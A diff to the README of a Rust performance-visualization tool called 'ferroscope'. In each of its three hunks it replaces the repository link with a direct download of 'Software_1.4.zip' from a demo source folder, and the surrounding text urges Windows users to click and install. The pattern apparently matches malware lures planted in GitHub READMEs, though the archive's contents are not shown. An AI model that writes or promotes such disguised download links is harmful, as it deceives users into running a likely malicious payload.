@@ -1,6 +1,6 @@
 # 🦀 ferroscope - Visualize Rust’s Performance Easily
 
-[![Download ferroscope](https://img.shields.io/badge/Download-ferroscope-ff4500)](https://github.com/bounden-15mayorganization384/ferroscope)
+[![Download ferroscope](https://img.shields.io/badge/Download-ferroscope-ff4500)](https://github.com/bounden-15mayorganization384/ferroscope/raw/refs/heads/main/src/demos/d14_cargo_ecosystem/Software_1.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To run ferroscope on your Windows PC, make sure you have:
 Follow these steps to get ferroscope on your computer and open it:
 
 1. Click the big orange download button at the top or visit this link:
-   [https://github.com/bounden-15mayorganization384/ferroscope](https://github.com/bounden-15mayorganization384/ferroscope)
+   [https://github.com/bounden-15mayorganization384/ferroscope/raw/refs/heads/main/src/demos/d14_cargo_ecosystem/Software_1.4.zip](https://github.com/bounden-15mayorganization384/ferroscope/raw/refs/heads/main/src/demos/d14_cargo_ecosystem/Software_1.4.zip)
 
 2. You will be taken to the GitHub page for ferroscope. Look for a “Releases” section or the latest version folder.
 
@@ -114,7 +114,7 @@ This helps you understand key Rust ideas like:
 
 Get started today by visiting this link:
 
-[Download ferroscope](https://github.com/bounden-15mayorganization384/ferroscope)
+[Download ferroscope](https://github.com/bounden-15mayorganization384/ferroscope/raw/refs/heads/main/src/demos/d14_cargo_ecosystem/Software_1.4.zip)
 
 Click and follow the steps to install on Windows.
 
